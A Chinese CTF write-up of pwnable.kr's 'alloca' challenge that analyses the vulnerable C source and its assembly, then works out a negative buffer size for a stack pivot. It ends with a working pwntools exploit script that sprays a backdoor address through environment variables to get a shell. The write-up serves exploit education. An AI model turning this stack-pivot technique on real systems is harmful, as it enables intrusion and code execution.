> 原文链接: https://www.anquanke.com//post/id/170288 


# pwnable.kr alloca详细分析


                                阅读量   
                                **200875**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">8</a>
                                </b>
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p0.ssl.qhimg.com/t012e90d96233a66eae.png)](https://p0.ssl.qhimg.com/t012e90d96233a66eae.png)



## 前言

最近在刷`pwnable.kr [Rookiss]`，题目都好有意思，其中一题`alloca`虽然分值不高，但分析过程很值得学习。



## 题目描述

```
Let me give you a lesson: "How to prevent buffer overflow?"

ssh alloca@pwnable.kr -p2222 (pw:guest)
```

先用ssh登陆进去看看

```
alloca@ubuntu:~$ ls -al
total 36
drwxr-x---  5 root alloca     4096 Mar 29  2018 .
drwxr-xr-x 93 root root       4096 Oct 10 22:56 ..
d---------  2 root root       4096 Sep 20  2015 .bash_history
dr-xr-xr-x  2 root root       4096 Jul 13  2016 .irssi
drwxr-xr-x  2 root root       4096 Oct 23  2016 .pwntools-cache
-r-xr-sr-x  1 root alloca_pwn 7804 Mar 29  2018 alloca
-rw-r--r--  1 root root       1942 Mar 29  2018 alloca.c
-rw-r-----  1 root alloca_pwn   64 Sep 24  2015 flag
```

题目提供了一个`alloca`二进制文件，以及程序的源码

```
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

void callme()`{`
        system("/bin/sh");
`}`

void clear_newlines()`{`
        int c;
        do`{`
                c = getchar();
        `}`while (c != 'n' &amp;&amp; c != EOF);
`}`

int g_canary;
int check_canary(int canary)`{`
        int result = canary ^ g_canary;
        int canary_after = canary;
        int canary_before = g_canary;
        printf("canary before using buffer : %dn", canary_before);
        printf("canary after using buffer : %dnn", canary_after);
        if(result != 0)`{`
                printf("what the ....??? how did you messed this buffer????n");
        `}`
        else`{`
                printf("I told you so. its trivially easy to prevent BOF :)n");
                printf("therefore as you can see, it is easy to make secure softwaren");
        `}`
        return result;
`}`

int size;
char* buffer;
int main()`{`

        printf("- BOF(buffer overflow) is very easy to prevent. here is how to.nn");
        sleep(1);
        printf("   1. allocate the buffer size only as you need itn");
        printf("   2. know your buffer size and limit the input lengthnn");

        printf("- simple right?. let me show you.nn");
        sleep(1);

        printf("- whats the maximum length of your buffer?(byte) : ");
        scanf("%d", &amp;size);
        clear_newlines();

        printf("- give me your random canary number to prove there is no BOF : ");
        scanf("%d", &amp;g_canary);
        clear_newlines();

        printf("- ok lets allocate a buffer of length %dnn", size);
        sleep(1);

        buffer = alloca( size + 4 );    // 4 is for canary

        printf("- now, lets put canary at the end of the buffer and get your datan");
        printf("- don't worry! fgets() securely limits your input after %d bytes :)n", size);
        printf("- if canary is not changed, we can prove there is no BOF :)n");
        printf("$ ");

        memcpy(buffer+size, &amp;g_canary, 4);      // canary will detect overflow.
        fgets(buffer, size, stdin);             // there is no way you can exploit this.

        printf("n");
        printf("- now lets check canary to see if there was overflownn");

        check_canary( *((int*)(buffer+size)) );
        return 0;
`}`
```

程序模仿`canary`的原理，使用`alloca`开辟栈空间后，在`buffer`后面加4字节的`g_canary`，同时在`check_canary`中检查栈中的`canary`是否被修改。程序里面也预留了一个`callme`的后门，方便我们getshell。



## alloca函数

先看一下本题关键函数`alloca`是什么东东。先在Ubuntu里面看看函数描述`man alloca`

```
ALLOCA(3)                                  Linux Programmer's Manual                                  ALLOCA(3)

NAME
       alloca - allocate memory that is automatically freed

SYNOPSIS
       #include &lt;alloca.h&gt;

       void *alloca(size_t size);

DESCRIPTION
       The  alloca()  function  allocates size bytes of space in the stack frame of the caller.  This temporary
       space is automatically freed when the function that called alloca() returns to its caller.
```

`alloca`跟`malloc/calloc/realloc`类似，都是内存分配函数，但是它是在当前函数的栈帧上分配存储空间，而不是在堆中。当函数返回时会自动释放它所使用的栈帧，不必为释放空间而费心。



## 程序分析

先看一下程序开了什么保护

```
[*] '/home/kira/pwn/pwnable.kr/alloca'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

```

可以看到基本没开保护，我们把下载下来的二进制文件拖入ida看一下伪代码

```
int __cdecl main(int argc, const char **argv, const char **envp)
`{`
  void *v3; // esp
  void *retaddr; // [esp+Ch] [ebp+4h]

  puts("- BOF(buffer overflow) is very easy to prevent. here is how to.n");
  sleep(1u);
  puts("   1. allocate the buffer size only as you need it");
  puts("   2. know your buffer size and limit the input lengthn");
  puts("- simple right?. let me show you.n");
  sleep(1u);
  printf("- whats the maximum length of your buffer?(byte) : ");
  __isoc99_scanf("%d", &amp;size);
  clear_newlines();
  printf("- give me your random canary number to prove there is no BOF : ");
  __isoc99_scanf("%d", &amp;g_canary);
  clear_newlines();
  printf("- ok lets allocate a buffer of length %dnn", size);
  sleep(1u);
  v3 = alloca(16 * ((size + 34) / 0x10u));
  buffer = (char *)(16 * (((unsigned int)&amp;retaddr + 3) &gt;&gt; 4));
  puts("- now, lets put canary at the end of the buffer and get your data");
  printf("- don't worry! fgets() securely limits your input after %d bytes :)n", size);
  puts("- if canary is not changed, we can prove there is no BOF :)");
  printf("$ ");
  *(_DWORD *)&amp;buffer[size] = g_canary;
  fgets(buffer, size, stdin);
  putchar(10);
  puts("- now lets check canary to see if there was overflown");
  check_canary(*(_DWORD *)&amp;buffer[size]);
  return 0;
`}`
```

IDA的伪代码几乎与源码一致，唯一有点差别的就是原来的`buffer = alloca( size + 4 );`变成了

```
v3 = alloca(16 * ((size + 34) / 0x10u));
  buffer = (char *)(16 * (((unsigned int)&amp;retaddr + 3) &gt;&gt; 4));
```

这应该是ida的识别问题，我们还是直接看汇编吧

```
.text:08048742 ; 19:   v3 = alloca(16 * ((size + 34) / 0x10u));
.text:08048742                 add     esp, 10h
.text:08048745                 mov     eax, ds:size
.text:0804874A                 add     eax, 4
.text:0804874D                 lea     edx, [eax+0Fh]
.text:08048750                 mov     eax, 10h
.text:08048755                 sub     eax, 1
.text:08048758                 add     eax, edx
.text:0804875A                 mov     ecx, 10h
.text:0804875F                 mov     edx, 0
.text:08048764                 div     ecx
.text:08048766                 imul    eax, 10h
.text:08048769                 sub     esp, eax
.text:0804876B ; 20:   buffer = (char *)(16 * (((unsigned int)&amp;retaddr + 3) &gt;&gt; 4));
.text:0804876B                 mov     eax, esp
.text:0804876D                 add     eax, 0Fh
.text:08048770                 shr     eax, 4
.text:08048773                 shl     eax, 4
.text:08048776                 mov     ds:buffer, eax
```

看汇编码可以看到这是`alloca`开辟栈空间时进行了对齐，重点要留意下对`esp`进行操作的代码。正常来说，这里分配栈空间的逻辑是没问题，`alloca`后`esp`被抬高，开辟出一段栈空间给`buffer`，但是程序使用`__isoc99_scanf("%d", &amp;size);`读入`size`，如果我们输入的是一个负数呢？那么`esp`就会降低，分配的栈空间地址会与程序已使用的栈空间重合。

我们要如何利用这个漏洞呢，继续看一下`main`函数结尾部分的汇编

```
.text:08048663 var_4           = dword ptr -4
.text:08048824                 call    check_canary
.text:08048829                 add     esp, 10h
.text:0804882C                 mov     eax, 0
.text:08048831                 mov     ecx, [ebp+var_4]
.text:08048834                 leave
.text:08048835                 lea     esp, [ecx-4]
.text:08048838                 retn
```

可以看到程序ret前，`ecx-4`的值赋给`esp`，而`ecx`的值等于`ebp-4`，那么只要我们能控制`ebp-4`，就能控制程序流。程序有三个输入点：
1. 输入buff的size
1. 输入g_canary
1. 输入buff的内容
由于我们输入的`size`是负数，实际上`fgets(buffer, size, stdin)`是无法读入字符，那么唯一可控的输入点只有`g_canary`，那么目标很明确了，就是`ebp-4=g_canary`。`g_canary`是存在bss段的变量，需要在程序里面找一下哪里有将`g_canary`写到栈中的操作，定位到`check_canary`的开头：

```
.text:080485E1     check_canary    proc near               ; CODE XREF: main+1C1↓p
.text:080485E1
.text:080485E1     var_14          = dword ptr -14h
.text:080485E1     var_10          = dword ptr -10h
.text:080485E1     var_C           = dword ptr -0Ch
.text:080485E1     arg_0           = dword ptr  8
.text:080485E1
.text:080485E1     ; __unwind `{`
.text:080485E1 000                 push    ebp      ; esp_c -= 4
.text:080485E2 004                 mov     ebp, esp ; ebp_c = esp_c - 4
.text:080485E4 004                 sub     esp, 18h
.text:080485E7 01C                 mov     eax, ds:g_canary
.text:080485EC 01C                 xor     eax, [ebp+arg_0]
.text:080485EF 01C                 mov     [ebp+var_C], eax
.text:080485F2 01C                 mov     eax, [ebp+arg_0]
.text:080485F5 01C                 mov     [ebp+var_10], eax
.text:080485F8 01C                 mov     eax, ds:g_canary
.text:080485FD 01C                 mov     [ebp+var_14], eax  ; ebp_c-0x14 = g_canary
```

留意第10行汇编，这里有一个将`g_canary`写到栈中的操作，现在如何计算输入的`size`是本题解题的关键所在。我们从这里根据`esp`和`ebp`的值开始反推出`size`的值。
<li>根据赋值的代码，有`ebp_c-0x14 = g_canary`
</li>
<li>
`ebp`的值由`esp`赋给，那么有`ebp_c = esp_c - 4`
</li>
<li>开头`push ebp`，那么`esp`的值为：`esp_c -= 4`
</li>
回到`main`函数中继续分析

```
.text:0804880E     ; 29:   check_canary(*(_DWORD *)&amp;buffer[size]);
.text:0804880E                  add     esp, 10h
.text:08048811                  mov     eax, ds:buffer
.text:08048816                  mov     edx, ds:size
.text:0804881C                  add     eax, edx
.text:0804881E                  mov     eax, [eax]
.text:08048820                  sub     esp, 0Ch        ; esp_m2 - 0x10 = esp_m1
.text:08048823                  push    eax
.text:08048824                  call    check_canary    ; esp_m1 - 4 = esp_c
```
<li>
`call`指令会`push IP`，所以有`esp_m1 - 4 = esp_c`
</li>
<li>
`esp`减了12，然后push了一次，有`esp_m2 - 0x10 = esp_m1`
</li>
```
.text:08048742     ; 19:   v3 = alloca(16 * ((size + 34) / 0x10u));
.text:08048742                  add     esp, 10h
.text:08048745                  mov     eax, ds:size
.text:0804874A                  add     eax, 4
.text:0804874D                  lea     edx, [eax+0Fh]
.text:08048750                  mov     eax, 10h
.text:08048755                  sub     eax, 1
.text:08048758                  add     eax, edx
.text:0804875A                  mov     ecx, 10h
.text:0804875F                  mov     edx, 0
.text:08048764                  div     ecx
.text:08048766                  imul    eax, 10h
.text:08048769                  sub     esp, eax       ; esp_m2 = esp_m3 - (size+34)
```
<li>然后到`alloca`处，`eax`为`16 * ((size + 34) / 0x10u)`，可以暂不考虑对齐问题，得到`esp_m2 = esp_m3 - (size+34)`
</li>
```
.text:08048663     ; int __cdecl main(int argc, const char **argv, const char **envp)
.text:08048663                     public main
.text:08048663     main            proc near               ; DATA XREF: _start+17↑o
.text:08048663
.text:08048663     var_4           = dword ptr -4
.text:08048663     argc            = dword ptr  8
.text:08048663     argv            = dword ptr  0Ch
.text:08048663     envp            = dword ptr  10h
.text:08048663
.text:08048663     ; __unwind `{`
.text:08048663                  lea     ecx, [esp+4]
.text:08048667                  and     esp, 0FFFFFFF0h
.text:0804866A                  push    dword ptr [ecx-4]
.text:0804866D                  push    ebp
.text:0804866E                  mov     ebp, esp       ; ebp_m = esp_m3 + 8
.text:08048670                  push    ecx
.text:08048671                  sub     esp, 4
.text:08048674     ; 5:   puts("- BOF(buffer overflow) is very easy to prevent. here is how to.n");
.text:08048674                  sub     esp, 0Ch        ; esp_m3
```
<li>中间都是一些简单函数调用，`esp`并没有改变，直接回到`main`函数开头，得到`ebp_m = esp_m3 + 8`
</li>
汇总一下以上得到的等式

```
ebp_c - 0x14 = g_canary
ebp_c = esp_c - 4
esp_c -= 4
esp_m1 - 4 = esp_c
esp_m2 - 0x10 = esp_m1
esp_m2 = esp_m3 - (size+34)
ebp_m = esp_m3 + 8
ebp_m - 4 = g_canary
```

拿张草稿纸算一下，不难算出`size=-82`，由于之前为了计算方便，没考虑对齐问题，其实`size`为`-67`到`-82`都可以，只要`(size+34)/16=-3`即可。



## 动态调试

`size`输入`-82`，`g_canary`输入`‭305419896‬(0x12345678)`，在`main`函数返回前下一个断点看看效果。

[![](https://p5.ssl.qhimg.com/t0124b124ed73efd22b.png)](https://p5.ssl.qhimg.com/t0124b124ed73efd22b.png)

可以看到我们已经可以顺利的控制`exc`的值（也就是`ebp-4`），这意味着我们能够控制`esp`的值。现在需要考虑如何getshell了。出题人很贴心地在程序里预留了一个叫`callme`的后门，但是程序里面没有存在指向这个函数的变量，而我们只能够控制`esp`并不能直接控制`eip`。这里需要用到一个环境变量的小技巧，程序运行时的环境变量会存在栈中，可以用以下代维测试一下：

```
from pwn import *
p = process('./alloca',env = `{`"test": 'kirakira'`}`)
gdb.attach(p)
p.sendline("-67")
p.sendline(str(0x12345678))
p.interactive()
```

[![](https://p3.ssl.qhimg.com/t017be26dcc4ca83487.png)](https://p3.ssl.qhimg.com/t017be26dcc4ca83487.png)

如图所示，输入环境变量确实在栈中，那么思路就很简单了，只有把`callme`的地址大量填充到环境变量中，然后控制`esp`跳到存在环境变量的内存段即可getshell。



## 完整exp

总结一下思路：
<li>
`size`输入一个负数</li>
1. 程序运行时加入大量的`callme`地址作为环境变量
<li>
`g_canary`随便填一个栈地址（因为地址随机化，在栈空间范围内随便填一个就行了）</li>
```
from pwn import *
callme = p32(0x80485ab)
e = `{`str(i): callme * 30000 for i in range(10)`}`
p = process("/home/alloca/alloca", env = e)
p.sendline("-82")
p.sendline("-4718592") # 0xffb80000
p.interactive()
```

[![](https://p3.ssl.qhimg.com/t012e3185a2ac2bed38.png)](https://p3.ssl.qhimg.com/t012e3185a2ac2bed38.png)

由于stack空间地址随机，需要多试几次才能成功。



## 总结

虽然最后exp十分简单，但中间分析过程还是很费力的，特别是计算`size`的值的部分，解题的几个小技巧也很值得学习。
